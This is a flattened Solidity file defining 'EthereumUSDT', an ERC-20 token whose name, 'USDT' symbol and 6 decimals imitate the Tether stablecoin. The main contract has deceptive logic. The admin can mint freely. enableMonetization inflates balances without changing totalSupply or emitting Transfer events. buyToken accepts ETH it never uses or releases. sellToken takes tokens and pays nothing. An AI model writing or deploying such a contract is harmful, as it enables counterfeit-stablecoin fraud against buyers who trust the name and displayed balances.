// SPDX-License-Identifier: MIT
// File: IERC20.sol


pragma solidity ^0.8.28;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: Ownable.sol


pragma solidity ^0.8.28;

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: SafeMath.sol


pragma solidity ^0.8.28;

library SafeMath {
    // Operación de adición
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    // Operación de sustracción
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    // Operación de multiplicación
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    // Operación de división
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    // Operación de módulo
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

// File: EthereumUSDT.sol


pragma solidity ^0.8.28;




contract EthereumUSDT is IERC20, Ownable {
    using SafeMath for uint256; // Usar SafeMath para operaciones de adición y sustracción

    string public constant name = "EthereumUSDT";
    string public constant symbol = "USDT";
    uint8 public constant decimals = 6;
    uint256 private _totalSupply = 1_000_000_000 * 10**6; // 1,000,000,000 USDT con 6 decimales

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);
    event MonetizationEnabled(address indexed user, uint256 amount);
    event BuyToken(address indexed user, uint256 amount);
    event SellToken(address indexed user, uint256 amount);
    event Swap(address indexed from, address indexed to, uint256 amount);

    address public admin; // Dirección del admin
    
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        // Establecer al creador del contrato como administrador
        admin = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "EthereumUSDT: Only admin can perform this action");
        _;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(recipient != address(0), "Invalid recipient");
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        require(spender != address(0), "Invalid spender");

        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(sender != address(0), "Invalid sender");
        require(recipient != address(0), "Invalid recipient");
        require(_balances[sender] >= amount, "Insufficient balance");
        require(_allowances[sender][msg.sender] >= amount, "Allowance exceeded");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(address to, uint256 amount) public onlyAdmin {
        require(to != address(0), "Invalid address");

        _totalSupply = _totalSupply.add(amount);
        _balances[to] = _balances[to].add(amount);

        emit Mint(to, amount);
        emit Transfer(address(0), to, amount);
    }

    function burn(uint256 amount) public {
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        _totalSupply = _totalSupply.sub(amount);
        _balances[msg.sender] = _balances[msg.sender].sub(amount);

        emit Burn(msg.sender, amount);
        emit Transfer(msg.sender, address(0), amount);
    }

    function mintMultiple(address[] memory recipients, uint256[] memory amounts) public onlyAdmin {
        require(recipients.length == amounts.length, "Mismatched arrays");

        for (uint256 i = 0; i < recipients.length; i++) {
            mint(recipients[i], amounts[i]);
        }
    }

    // Nuevas funciones para monetización
    function enableMonetization(address user, uint256 amount) external onlyAdmin {
        require(user != address(0), "User cannot be the zero address");
        require(amount > 0, "Amount must be greater than zero");
        _balances[user] = _balances[user].add(amount);
        emit MonetizationEnabled(user, amount);
    }

    function buyToken(uint256 amount) external payable {
        require(amount > 0, "Amount must be greater than zero");
        uint256 tokenAmount = amount * (10 ** uint256(decimals)); // Usar el decimal adecuado
        require(_balances[admin] >= tokenAmount, "Not enough tokens available");
        _balances[admin] = _balances[admin].sub(tokenAmount);
        _balances[msg.sender] = _balances[msg.sender].add(tokenAmount);
        emit BuyToken(msg.sender, tokenAmount);
    }

    function sellToken(uint256 amount) external {
        require(amount > 0, "Amount must be greater than zero");
        require(_balances[msg.sender] >= amount, "Insufficient balance");
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[admin] = _balances[admin].add(amount);
        emit SellToken(msg.sender, amount);
    }

    function swap(address to, uint256 amount) external {
        require(to != address(0), "Target address cannot be zero address");
        require(amount > 0, "Amount must be greater than zero");
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Swap(msg.sender, to, amount);
    }

    // Función para cambiar el administrador, solo puede ser ejecutado por el admin actual
    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "EthereumUSDT: new admin is the zero address");
        admin = newAdmin;
    }
}